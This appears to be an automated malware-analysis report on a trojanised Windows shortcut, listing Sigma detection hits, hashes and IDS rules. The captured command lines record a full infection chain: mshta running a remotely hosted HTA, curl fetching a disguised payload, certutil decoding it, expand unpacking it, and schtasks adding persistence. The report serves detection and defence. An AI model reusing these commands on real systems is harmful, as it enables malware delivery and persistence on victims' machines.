attributes.magic: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has command line arguments, Icon number=21, Archive, ctime=Sat Dec  7 09:09:39 2019, mtime=Thu Dec 14 07:14:50 2023, atime=Sat Dec  7 09:09:39 2019, length=14848, window=hide

sigma_analysis_results.rule_title: Suspicious Binaries and Scripts in Public Folder
sigma_analysis_results.rule_description: Detects the creation of a file with a suspicious extension in the public folder, which could indicate potential malicious activity.

match_context.values: @{Image=C:\Windows\SysWOW64\cmd.exe; TargetFilename=C:\Users\Public\nView.dll; EventID=11}
@{Image=C:\Windows\SysWOW64\cmd.exe; TargetFilename=C:\Users\Public\nvTaskBar.exe; EventID=11}

sigma_analysis_results.rule_title: Windows Shell/Scripting Application File Write to Suspicious Folder
sigma_analysis_results.rule_description: Detects Windows shells and scripting applications that write files to suspicious folders

match_context.values: @{Image=C:\Windows\System32\certutil.exe; EventID=11; TargetFilename=C:\Users\Public\Documents\wct9D39.tmp}
@{Image=C:\Windows\SysWOW64\cmd.exe; EventID=11; TargetFilename=C:\Users\Public\nView.dll}
@{Image=C:\Windows\SysWOW64\cmd.exe; EventID=11; TargetFilename=C:\Users\Public\nvTaskBar.exe}

sigma_analysis_results.rule_title: Remotely Hosted HTA File Executed Via Mshta.EXE
sigma_analysis_results.rule_description: Detects execution of the "mshta" utility with an argument containing the "http" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file

match_context.values: @{Product=Internet Explorer; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=MSHTA.EXE; Hashes=SHA1=2DF819323AB8BDB951828AEE26AF1F1720DDE946,MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; Description=Microsoft (R) HTML Application host; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\Windows\System32\mshta.exe" https://mail.chapanakit-rta.com/Queen/M.hta; EventID=1; ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\mshta.exe; Company=Microsoft Corporation}
@{EventID=1; CommandLine=C:\Windows\System32\mshta.exe https://mail.chapanakit-rta.com/Queen/M.hta; Image=C:\Windows\System32\mshta.exe}

@{Product=Internet Explorer; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=MSHTA.EXE; Hashes=SHA1=2DF819323AB8BDB951828AEE26AF1F1720DDE946,MD5=197FC97C6A843BEBB445C1D9C58DCBDB,SHA256=64E7A255A1AF1B54FD9243FAACB76A6527513FECF1B26BC3C9B8D3824DC9BDF9,IMPHASH=42DA177DE2FAA97C3DFAEC9562772A7F; Description=Microsoft (R) HTML Application host; FileVersion=11.00.17134.1 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\Windows\System32\mshta.exe" https://mail.chapanakit-rta.com/Queen/M.hta; EventID=1; ParentImage=C:\Windows\explorer.exe; IntegrityLevel=High; Image=C:\Windows\System32\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Windows Shell/Scripting Processes Spawning Suspicious Programs
sigma_analysis_results.rule_description: Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.

match_context.values: @{Hashes=SHA1=C37F0870B14F2C75C88988D264A0E5A19633F3D7,MD5=DA0155C226C3C63BFC65EF03B86B4DF2,SHA256=B090E098EAE8FD2CE0670C92E2942A38210767F1CDA49BDE81F2855C97C8BB9E,IMPHASH=438E40B9AC2C5BCEF5E9D93189C39755; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=CertUtil.exe; Product=Microsoft\xae Windows\xae Operating System; Description=CertUtil.exe; EventID=1; ParentCommandLine="C:\Windows\System32\mshta.exe" https://mail.chapanakit-rta.com/Queen/M.hta; CommandLine="C:\Windows\System32\certutil.exe" -decode "C:\Users\Public\Documents\wct9D39.jpg" "C:\Users\Public\Documents\wct9D39.tmp"; FileVersion=10.0.17134.254 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\mshta.exe; IntegrityLevel=High; Image=C:\Windows\System32\certutil.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Potentially Suspicious Execution From Parent Process In Public Folder
sigma_analysis_results.rule_description: Detects a potentially suspicious execution of a parent process located in the "\Users\Public" folder executing a child process containing references to shell or scripting binaries and commandlines.
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=Cmd.Exe; Hashes=SHA1=502285D9914448259E73B18843B088FE972841D6,MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; Description=Windows Command Processor; EventID=1; ParentCommandLine=c:\users\public\Videos\winp.exe; CommandLine=cmd.exe /c copy "C:\Users\Public\JQTDU3NB3WIV5YFTKY" /B + "C:\Users\Public\7TTELM5VHDI33VE0NN" /B C:\Users\Public\nView.dll /B /Y; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Users\Public\Videos\winp.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\cmd.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=Cmd.Exe; Hashes=SHA1=502285D9914448259E73B18843B088FE972841D6,MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; Description=Windows Command Processor; EventID=1; ParentCommandLine=c:\users\public\Videos\winp.exe; CommandLine=cmd.exe /c copy "C:\Users\Public\ZICLIAE0QC8Z7AD6JX" /B + "C:\Users\Public\759RE2H5A3OSNM03K4" /B C:\Users\Public\nvTaskBar.exe /B /Y; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Users\Public\Videos\winp.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\cmd.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects a suspicious process spawning from an "mshta.exe" process, which could be indicative of a malicious HTA script execution

match_context.values: @{Hashes=SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=Cmd.Exe; Product=Microsoft\xae Windows\xae Operating System; Description=Windows Command Processor; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\mshta.exe" https://mail.chapanakit-rta.com/Queen/M.hta; CommandLine="C:\Windows\system32\cmd.exe" /c ping -n 10 127.0.0.1 > nul; EventID=1; ParentImage=C:\Windows\System32\mshta.exe; IntegrityLevel=High; Image=C:\Windows\System32\cmd.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=Cmd.Exe; Product=Microsoft\xae Windows\xae Operating System; Description=Windows Command Processor; EventID=1; ParentCommandLine="C:\Windows\System32\mshta.exe" https://mail.chapanakit-rta.com/Queen/M.hta; CommandLine="C:\Windows\system32\cmd.exe" /c ping -n 20 127.0.0.1 > nul; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\mshta.exe; IntegrityLevel=High; Image=C:\Windows\System32\cmd.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects a suspicious curl process start on Windows and outputs the requested document to a local file
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{Product=The curl executable; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=curl.exe; Hashes=SHA1=B073B1B84A589B7FEFD380AE9E097C3040E4DD07,MD5=2419907A0BB9A14F1871F0BDA7F65578,SHA256=C53B0901C262071DA3F3FBB69C30C2C26E2AB7866C7C42183C830B9A609C7994,IMPHASH=93009B50C3F15A001009BCDE9939BF92; Description=The curl executable; FileVersion=7.55.1; ParentCommandLine="C:\Windows\System32\mshta.exe" https://mail.chapanakit-rta.com/Queen/M.hta; CommandLine="C:\Windows\System32\curl.exe" https://mail.chapanakit-rta.com/pt/wct9D39.jpg -o C:\Users\Public\Documents\wct9D39.jpg; EventID=1; ParentImage=C:\Windows\System32\mshta.exe; IntegrityLevel=High; Image=C:\Windows\System32\curl.exe; Company=curl, https://curl.haxx.se/}

sigma_analysis_results.rule_title: Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE
sigma_analysis_results.rule_description: Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=schtasks.exe; Hashes=SHA1=BBE6394229CE3A53ECCD2CB4CEA6EE41134EFDA9,MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; Description=Task Scheduler Configuration Tool; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=c:\users\public\Videos\winp.exe; CommandLine= /create /f /sc MINUTE /MO 10 /tn "ToSestsc" /tr "\"C:\Users\Public\nvTaskBar.exe\" usea"; EventID=1; ParentImage=C:\Users\Public\Videos\winp.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\schtasks.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects the expansion or decompression of cabinet files from potentially suspicious or uncommon locations, e.g. seen in Iranian MeteorExpress related attacks

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=expand; Hashes=SHA1=514D2351D47A60B902EFC744DDB04FEB91B8F4F4,MD5=916E9A1FEAED4C083C89FFD4FC9B0781,SHA256=A6195FAC083495AE3BC4ADCD5C53DDFB1EE6F03FC9D25216BE52A6398183FC0E,IMPHASH=8BB8291E08A891E3DCA4B595B2F1D718; Description=LZ Expansion Utility; EventID=1; ParentCommandLine="C:\Windows\System32\mshta.exe" https://mail.chapanakit-rta.com/Queen/M.hta; CommandLine="C:\Windows\System32\expand.exe" C:\Users\Public\Documents\wct9D39.tmp -f:* c:\users\public\Videos\winp.exe; FileVersion=5.00 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\mshta.exe; IntegrityLevel=High; Image=C:\Windows\System32\expand.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: File Decoded From Base64/Hex Via Certutil.EXE
sigma_analysis_results.rule_description: Detects the execution of certutil with either the "decode" or "decodehex" flags to decode base64 or hex encoded files. This can be abused by attackers to decode an encoded payload before execution
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=CertUtil.exe; Hashes=SHA1=C37F0870B14F2C75C88988D264A0E5A19633F3D7,MD5=DA0155C226C3C63BFC65EF03B86B4DF2,SHA256=B090E098EAE8FD2CE0670C92E2942A38210767F1CDA49BDE81F2855C97C8BB9E,IMPHASH=438E40B9AC2C5BCEF5E9D93189C39755; Description=CertUtil.exe; FileVersion=10.0.17134.254 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\mshta.exe" https://mail.chapanakit-rta.com/Queen/M.hta; CommandLine="C:\Windows\System32\certutil.exe" -decode "C:\Users\Public\Documents\wct9D39.jpg" "C:\Users\Public\Documents\wct9D39.tmp"; EventID=1; ParentImage=C:\Windows\System32\mshta.exe; IntegrityLevel=High; Image=C:\Windows\System32\certutil.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects the creation of scheduled tasks by user accounts via the "schtasks" utility.

match_context.values: @{Hashes=SHA1=BBE6394229CE3A53ECCD2CB4CEA6EE41134EFDA9,MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A4F72,IMPHASH=FC93D9248DEA161B2E724C188AECD07D; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=schtasks.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Task Scheduler Configuration Tool; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=c:\users\public\Videos\winp.exe; CommandLine= /create /f /sc MINUTE /MO 10 /tn "ToSestsc" /tr "\"C:\Users\Public\nvTaskBar.exe\" usea"; EventID=1; ParentImage=C:\Users\Public\Videos\winp.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\schtasks.exe; Company=Microsoft Corporation}

exiftool.Flags: IDList, LinkInfo, RelativePath, CommandArgs, IconFile, Unicode, ExpString

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ids_results.rule_msg: POLICY-OTHER SSL/TLS weak RC4 cipher suite use attempt
crowdsourced_ids_results.rule_raw: alert tcp $EXTERNAL_NET 443 -> $HOME_NET any ( msg:"POLICY-OTHER SSL/TLS weak RC4 cipher suite use attempt"; flow:to_client,established; ssl_state:server_hello; content:"|02|",depth 1,offset 5; byte_jump:1,37,relative; content:"|00 05|",within 2; metadata:policy max-detect-ips drop; service:ssl; reference:bugtraq,73684; reference:cve,2015-2808; classtype:policy-violation; sid:37026; rev:6; )

alert icmp $HOME_NET any -> $EXTERNAL_NET any ( msg:"PROTOCOL-ICMP Unusual PING detected"; icode:0; itype:8; fragbits:!M; content:!"ABCDEFGHIJKLMNOPQRSTUVWABCDEFGHI",depth 32; content:!"0123456789abcdefghijklmnopqrstuv",depth 32; content:!"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE",depth 36; content:!"WANG2"; content:!"cacti-monitoring-system",depth 65; content:!"SolarWinds",depth 72; metadata:policy max-detect-ips drop,ruleset community; reference:url,krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/; reference:url,krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/; classtype:successful-recon-limited; sid:29456; rev:3; )
alert ( gid:119; sid:279; rev:1; msg:"(http_inspect) invalid status line"; metadata: rule-type preproc; classtype:unknown;)

crowdsourced_ids_results.rule_msg: SURICATA Applayer Detect protocol only one direction
crowdsourced_ids_results.rule_raw: alert ip any any -> any any (msg:"SURICATA Applayer Detect protocol only one direction"; flow:established; app-layer-event:applayer_detect_protocol_only_one_direction; flowint:applayer.anomaly.count,+,1; classtype:protocol-command-decode; sid:2260002; rev:1;)
alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP PING Windows"; itype:8; content:"abcdefghijklmnop",depth 16; metadata:ruleset community; classtype:misc-activity; sid:382; rev:11; )
alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP PING"; icode:0; itype:8; metadata:ruleset community; classtype:misc-activity; sid:384; rev:8; )
alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:"PROTOCOL-ICMP Echo Reply"; icode:0; itype:0; metadata:ruleset community; classtype:misc-activity; sid:408; rev:8; )
